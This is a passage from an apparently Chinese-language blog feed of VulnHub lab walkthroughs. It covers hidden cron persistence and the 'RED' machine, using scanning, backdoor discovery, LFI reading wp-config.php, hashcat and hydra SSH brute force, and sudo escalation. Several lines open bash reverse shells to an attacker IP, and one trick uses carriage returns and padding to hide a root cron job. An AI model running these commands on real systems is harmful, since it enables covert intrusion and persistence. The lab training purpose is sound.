&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看当前计划任务有哪些&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;crontab -l&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; /root/.first.sh &amp;lt;&amp;lt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; /root/.second.sh &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(crontab -l;printf &amp;quot;*/1 * * * * /root/.first.sh;\rno crontab for `whoami`%100c\n&amp;quot;)|crontab -&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;*/1 * * * *：每隔 1 分钟执行一次；&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;/r：&lt;span class=&#34;built_in&#34;&gt;cat&lt;/span&gt;默认支持 \r 回车符 \n 换行符 \f 换页符这些符号，会导致显示截断隐藏命令，隐藏真实的计划任务；&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;%100c：格式化输出一个字符，前面 99 个空格补齐。使用空格帮助我们把前面的内容在 crontab 中遮盖掉；&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;如果想让创建的文件隐蔽性更强，可以创建名为&lt;span class=&#34;string&#34;&gt;&amp;quot;..&amp;quot;&lt;/span&gt;、“...”或以..等开头的文件。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod 777 .first.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod 777 .second.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/root/.second.sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-191.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;如果发现无法运行，可以通过下列两个命令查看详细计划任务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /var/spool/cron/crontabs/root -A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;crontab -e 或者 vi /etc/crontab&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在kali机器上监听 4444 端口，每隔一分钟收到将会一次shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc - lvvp 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;执行一下命令产生一个标准的shell：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-192.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 只要开启 kali 的 4444 端口，很快就会收到 root 账户的 shell&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/110%20RED/</guid>
            <title>VULNHUB 10 RED</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/110%20RED/</link>
            <category>VULNHUB 1-10</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcmVkLTEsNzUzLw==&#34;&gt;https://www.vulnhub.com/entry/red-1,753/&lt;/span&gt;&lt;br&gt;
 教程链接地址 1：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yZWFkeXNldGV4cGxvaXQud29yZHByZXNzLmNvbS8yMDIxLzExLzAyL2hhY2tpbmctbGFiLXJlZC8=&#34;&gt;https://readysetexploit.wordpress.com/2021/11/02/hacking-lab-red/&lt;/span&gt;&lt;br&gt;
 教程链接地址 2：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lvdXRoQmVsaWVmL2FydGljbGUvZGV0YWlscy8xMjI0NTg3MDU=&#34;&gt;https://blog.csdn.net/YouthBelief/article/details/122458705&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 RED：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP&lt;br&gt;
 &lt;code&gt;sudo nmap -PA 192.168.31.107 --excludefile myip.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-193.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.14&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A -p- 192.168.31.14 -oN /tmp/red.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-194.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22, 80&lt;/p&gt;
&lt;h3 id=&#34;修改本地-hosts&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修改本地-hosts&#34;&gt;#&lt;/a&gt; 修改本地 hosts&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQ=&#34;&gt;http://192.168.31.14&lt;/span&gt; 进行信息收集&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-195.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;点击 “Hello Blue” 发现一个跳转界面，无法打开&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-196.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改本地 hosts 文件 /etc/hosts, 改变 DNS 解析记录&lt;br&gt;
 192.168.31.14 redrocks.win&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-197.png&#34; width=&#34;340&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;重新打开 url 地址，发现这里说网站已被攻击，并且有后门文件&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JlZHJvY2tzd2luLzIwMjEvMTAvMjQvaGVsbG8td29ybGQv&#34;&gt; http://redrocks.win/2021/10/24/hello-world/&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-198.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;审查源代码，找到 Mr.Miessler 这个提示&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-199.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;通过搜索，找到了这个人是 SecLists 的开发者&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-200.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;seclists-字典&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#seclists-字典&#34;&gt;#&lt;/a&gt; seclists 字典&lt;/h3&gt;
&lt;p&gt;Seclists 是一个全面的字典，包括用户名、密码、URL、敏感数据模式、模糊测试负载、Web Shell 等等，在 kali 中 apt - y install seclists 安装，我们现在要想办法扫出来已被攻击服务器上的后门文件&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用gobuster加载seclists中的通用后门字典进行扫描。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gobuster dir -u http://redrocks.win/ -w /usr/share/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt -x php,txt,html&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-201.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;找到一个后门文件 NetworkFileManagerPHP.php&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-202.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;这应该就是后门文件了，但是我们没有参数值，需要爆破&lt;/p&gt;
&lt;h3 id=&#34;wfuzz-爆破参数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wfuzz-爆破参数&#34;&gt;#&lt;/a&gt; wfuzz 爆破参数&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用wfuzz加载seclists中的爆破参数名字的字典进行爆破&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wfuzz -c -u http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=xxx -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-203.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到的结果是 key 的返回值是 200&lt;br&gt;
-&amp;gt; 可以构造 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JlZHJvY2tzLndpbi9OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhwP2tleT14eHg=&#34;&gt;http://redrocks.win/NetworkFileManagerPHP.php?key=xxx&lt;/span&gt; 访问&lt;/p&gt;
&lt;h3 id=&#34;lfi-文件包含漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-文件包含漏洞&#34;&gt;#&lt;/a&gt; lfi 文件包含漏洞&lt;/h3&gt;
&lt;p&gt;尝试使用文件包含协议进行访问敏感文件&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JlZHJvY2tzLndpbi9OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhwP2tleT0vZXRjL3Bhc3N3ZA==&#34;&gt;http://redrocks.win/NetworkFileManagerPHP.php?key=/etc/passwd&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-204.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;尝试获取 NetworkFileManagerPHP.php 的源码&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JlZHJvY2tzLndpbi9OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhwP2tleT1OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhw&#34;&gt; http://redrocks.win/NetworkFileManagerPHP.php?key=NetworkFileManagerPHP.php&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-205.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;发现内容显示不了，我们需要配合其他协议&lt;/p&gt;
&lt;p&gt;尝试用 php://filter/read=convert.base6 4 - encode/resource=xxx.php&lt;br&gt;
 的 filter 协议去读取一些敏感文件&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JlZHJvY2tzLndpbi9OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhwL05ldHdvcmtGaWxlTWFuYWdlclBIUC5waHA/a2V5&#34;&gt; http://redrocks.win/NetworkFileManagerPHP.php/NetworkFileManagerPHP.php?key&lt;/span&gt;&lt;br&gt;
=php://filter/read=convert.base64-encode/resource=NetworkFileManagerPHP.php&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-206.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;对字符串进行 base64 解密&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-207.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;继续读取文件，发现暗藏了一个 base64 密文，再次解密&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-208.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;这里说是 “这个密码并不能帮助您！Hashcat 说规则就是规则”&lt;/p&gt;
&lt;p&gt;由于网站是 wordpress 搭建的，我们可以去访问数据库信息获取一些配置文&lt;br&gt;
件，我们通过文件包含漏洞访问 wp-config.php 查看配置文件信息&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JlZHJvY2tzLndpbi9OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhwL05ldHdvcmtGaWxlTWFuYWdlclBIUC5waHA/a2V5PXBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT13cC1jb25maWcucGhw&#34;&gt; http://redrocks.win/NetworkFileManagerPHP.php/NetworkFileManagerPHP.php?key=php://filter/read=convert.base64-encode/resource=wp-config.php&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-209.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;通过 echo “xx” | base64 - d 的方式解密，得到数据库配置信息&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-210.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 用户名：john 密码：R3v_m4lwh3r3_k1nG!!&lt;/p&gt;
&lt;h3 id=&#34;hashcut-使用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hashcut-使用&#34;&gt;#&lt;/a&gt; hashcut 使用&lt;/h3&gt;
&lt;p&gt;hashcat 生成密码对应的字典，hydra 连接 ssh&lt;br&gt;
hashcat --stdout pass.txt -r /usr/share/hashcat/rules/best64.rule &amp;gt; pass2.txt&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-211.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;用 hydra 选择用户 john，密码为 hashcat 生成的字典进行连接 ssh&lt;br&gt;
hydra -l john -P pass2.txt ssh://192.168.31.14 -f -t 4 -vV -o hydra.ssh&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-212.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 用户名：join 密码：R3v_m4lwh3r3_k1nG!!21&lt;/p&gt;
&lt;h3 id=&#34;sudotime提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudotime提权&#34;&gt;#&lt;/a&gt; sudo (time) 提权&lt;/h3&gt;
&lt;p&gt;尝试登陆服务器的时候，发现密码是错误的&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-213.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;再次用 hydra 破解 ssh 爆破，果然得到了不一样的密码，可能密码会定时修改&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-214.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;登陆服务器，sudo -l 发现有 time 可提权&lt;br&gt;
在 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v&#34;&gt;https://gtfobins.github.io/&lt;/span&gt; 上找到提权命令，进行权限升级&lt;br&gt;
 &lt;code&gt;sudo -u ippsec /usr/bin/time /bin/bash&lt;/code&gt; &lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-215.png&#34; width=&#34;430&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;此会话窗口不稳定，间断性的被中断，而且密码每隔一段时间都会被修改，因此我们需要反弹出来一个稳定的 shell&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-216.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4445 0&amp;gt;&amp;amp;1&lt;/code&gt; &lt;br&gt;
 通过此命令反弹出来的 shell 仍然会被中断&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;选择加载到/dev/shm/中来反弹shell,命令&lt;span class=&#34;built_in&#34;&gt;cat&lt;/span&gt;被改写用&lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt;替代&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;#!/bin/bash&amp;#x27; &amp;gt; /dev/shm/shell.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4445 0&amp;gt;&amp;amp;1&amp;#x27; &amp;gt;&amp;gt; /dev/shm/shell.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod +x /dev/shm/shell.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/dev/shm/shell.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-217.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;当原来的终端再次被强制退出的时候，我们的新终端貌似也出了一些意外&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-218.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;我们只需要再次输入 python3 -c ‘import pty;pty.spawn (&amp;quot;/bin/bash&amp;quot;)’, 即可获得一个标准化的终端&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-219.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;pspy64s-监控&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pspy64s-监控&#34;&gt;#&lt;/a&gt; pspy64s 监控&lt;/h3&gt;
